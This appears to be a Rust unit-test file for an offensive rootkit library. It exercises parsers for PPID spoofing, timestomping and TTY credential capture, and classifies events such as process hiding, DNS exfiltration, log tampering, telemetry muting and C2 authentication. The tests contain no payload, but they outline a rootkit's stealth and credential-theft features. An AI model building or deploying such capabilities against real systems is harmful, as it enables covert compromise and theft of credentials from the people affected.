use common::{
    CredentialCapture, EventHeader, RootkitConfig, TimestompEntry, EVENT_ANCESTRY_SPOOFED,
    EVENT_ANTI_DETACH, EVENT_C2_AUTH_FAILED, EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED,
    EVENT_KALLSYMS_HIDDEN, EVENT_LOG_TAMPERED, EVENT_PACKET_INTERCEPTED, EVENT_PROC_HIDDEN,
    EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
};
use offense::{
    classify_event, credential_data, make_rootkit_config, parse_spoof_ppid, parse_timestomp,
    parse_tty_device, tty_dev_key, EventClassification,
};

// ─── TTY Device Parsing ───────────────────────────────────────────

#[test]
fn test_parse_tty_valid() {
    assert_eq!(parse_tty_device("136:0"), Some((136, 0)));
    assert_eq!(parse_tty_device("4:64"), Some((4, 64)));
    assert_eq!(parse_tty_device("0:0"), Some((0, 0)));
}

#[test]
fn test_parse_tty_invalid_format() {
    assert_eq!(parse_tty_device("136"), None);
    assert_eq!(parse_tty_device("136:0:1"), None);
    assert_eq!(parse_tty_device(""), None);
    assert_eq!(parse_tty_device(":"), None);
}

#[test]
fn test_parse_tty_non_numeric() {
    assert_eq!(parse_tty_device("abc:0"), None);
    assert_eq!(parse_tty_device("136:xyz"), None);
    assert_eq!(parse_tty_device("-1:0"), None);
}

#[test]
fn test_tty_dev_key_encoding() {
    let key = tty_dev_key(136, 0);
    assert_eq!(key, (136u64 << 32) | 0);

    let key = tty_dev_key(4, 64);
    assert_eq!(key, (4u64 << 32) | 64);

    let key = tty_dev_key(0, 0);
    assert_eq!(key, 0);
}

// ─── PPID Spoofing Parsing ────────────────────────────────────────

#[test]
fn test_parse_spoof_ppid_valid() {
    assert_eq!(parse_spoof_ppid("1234:1"), Some((1234, 1)));
    assert_eq!(parse_spoof_ppid("0:0"), Some((0, 0)));
    assert_eq!(parse_spoof_ppid("99999:2"), Some((99999, 2)));
}

#[test]
fn test_parse_spoof_ppid_invalid() {
    assert_eq!(parse_spoof_ppid("1234"), None);
    assert_eq!(parse_spoof_ppid("1234:1:2"), None);
    assert_eq!(parse_spoof_ppid("abc:1"), None);
    assert_eq!(parse_spoof_ppid(""), None);
}

// ─── Timestomp Parsing ────────────────────────────────────────────

#[test]
fn test_parse_timestomp_valid() {
    let result = parse_timestomp("12345:1000:2000:3000");
    assert!(result.is_some());
    let (inode, entry) = result.unwrap();
    assert_eq!(inode, 12345);
    assert_eq!(entry.fake_atime_sec, 1000);
    assert_eq!(entry.fake_mtime_sec, 2000);
    assert_eq!(entry.fake_ctime_sec, 3000);
}

#[test]
fn test_parse_timestomp_zero_values() {
    let result = parse_timestomp("0:0:0:0");
    assert!(result.is_some());
    let (inode, entry) = result.unwrap();
    assert_eq!(inode, 0);
    assert_eq!(entry.fake_atime_sec, 0);
    assert_eq!(entry.fake_mtime_sec, 0);
    assert_eq!(entry.fake_ctime_sec, 0);
}

#[test]
fn test_parse_timestomp_invalid() {
    assert_eq!(parse_timestomp("12345:1000:2000"), None);
    assert_eq!(parse_timestomp("12345:1000:2000:3000:extra"), None);
    assert_eq!(parse_timestomp(""), None);
    assert_eq!(parse_timestomp("abc:1000:2000:3000"), None);
}

// ─── Event Classification ─────────────────────────────────────────

#[test]
fn test_classify_process_hidden() {
    let event = EventHeader {
        event_type: EVENT_PROC_HIDDEN,
        pid: 1234,
        timestamp_ns: 0,
        context: 0,
    };
    assert_eq!(
        classify_event(&event),
        EventClassification::ProcessHidden { pid: 1234 }
    );
}

#[test]
fn test_classify_packet_intercepted() {
    let event = EventHeader {
        event_type: EVENT_PACKET_INTERCEPTED,
        pid: 5,
        timestamp_ns: 0,
        context: 42,
    };
    assert_eq!(
        classify_event(&event),
        EventClassification::PacketIntercepted {
            cmd_type: 5,
            arg: 42
        }
    );
}

#[test]
fn test_classify_file_obfuscated() {
    let event = EventHeader {
        event_type: EVENT_FILE_OBFUSCATED,
        pid: 100,
        timestamp_ns: 0,
        context: 999,
    };
    assert_eq!(
        classify_event(&event),
        EventClassification::FileObfuscated {
            pid: 100,
            inode: 999
        }
    );
}

#[test]
fn test_classify_all_event_types() {
    let types = [
        (EVENT_PROC_HIDDEN, "ProcessHidden"),
        (EVENT_PACKET_INTERCEPTED, "PacketIntercepted"),
        (EVENT_FILE_OBFUSCATED, "FileObfuscated"),
        (EVENT_LOG_TAMPERED, "LogTampered"),
        (EVENT_ANCESTRY_SPOOFED, "AncestrySpoofed"),
        (EVENT_DNS_EXFIL, "DnsExfil"),
        (EVENT_KALLSYMS_HIDDEN, "KallsymsHidden"),
        (EVENT_ANTI_DETACH, "AntiDetach"),
        (EVENT_TIMESTOMPED, "Timestomped"),
        (EVENT_C2_AUTH_FAILED, "C2AuthFailed"),
        (EVENT_TELEMETRY_MUTED, "TelemetryMuted"),
    ];

    for (event_type, _name) in types {
        let event = EventHeader {
            event_type,
            pid: 1,
            timestamp_ns: 0,
            context: 0,
        };
        let classification = classify_event(&event);
        assert!(
            !matches!(classification, EventClassification::Unknown { .. }),
            "Event type {} should not be Unknown",
            event_type
        );
    }
}

#[test]
fn test_classify_unknown_event() {
    let event = EventHeader {
        event_type: 9999,
        pid: 1,
        timestamp_ns: 0,
        context: 0,
    };
    assert_eq!(
        classify_event(&event),
        EventClassification::Unknown { event_type: 9999 }
    );
}

// ─── Config Construction ──────────────────────────────────────────

#[test]
fn test_make_rootkit_config() {
    let config = make_rootkit_config(1234);
    assert_eq!(config.self_pid, 1234);
    assert_eq!(config.hide_procs, 1);
    assert_eq!(config.net_stealth, 1);
    assert_eq!(config.file_obfuscate, 1);
    assert_eq!(config.mute_telemetry, 1);
    assert_eq!(config._pad, [0u8; 4]);
}

#[test]
fn test_config_self_exclusion() {
    let config = make_rootkit_config(std::process::id());
    assert_eq!(config.self_pid, std::process::id());
}

// ─── Credential Data Extraction ───────────────────────────────────

#[test]
fn test_credential_data_extraction() {
    let mut capture = CredentialCapture {
        pid: 100,
        fd: 3,
        data_len: 5,
        _pad: 0,
        data: [0u8; 64],
    };
    capture.data[0] = b'h';
    capture.data[1] = b'e';
    capture.data[2] = b'l';
    capture.data[3] = b'l';
    capture.data[4] = b'o';

    let data = credential_data(&capture);
    assert_eq!(data, b"hello");
}

#[test]
fn test_credential_data_empty() {
    let capture = CredentialCapture {
        pid: 100,
        fd: 3,
        data_len: 0,
        _pad: 0,
        data: [0u8; 64],
    };
    let data = credential_data(&capture);
    assert_eq!(data.len(), 0);
}

#[test]
fn test_credential_data_max_length() {
    let capture = CredentialCapture {
        pid: 100,
        fd: 3,
        data_len: 64,
        _pad: 0,
        data: [0xAA; 64],
    };
    let data = credential_data(&capture);
    assert_eq!(data.len(), 64);
    assert!(data.iter().all(|&b| b == 0xAA));
}

// ─── Struct Layout (repr(C) correctness) ──────────────────────────

#[test]
fn test_event_header_size() {
    assert_eq!(std::mem::size_of::<EventHeader>(), 24);
}

#[test]
fn test_rootkit_config_size() {
    assert_eq!(std::mem::size_of::<RootkitConfig>(), 12);
}

#[test]
fn test_timestomp_entry_size() {
    assert_eq!(std::mem::size_of::<TimestompEntry>(), 24);
}
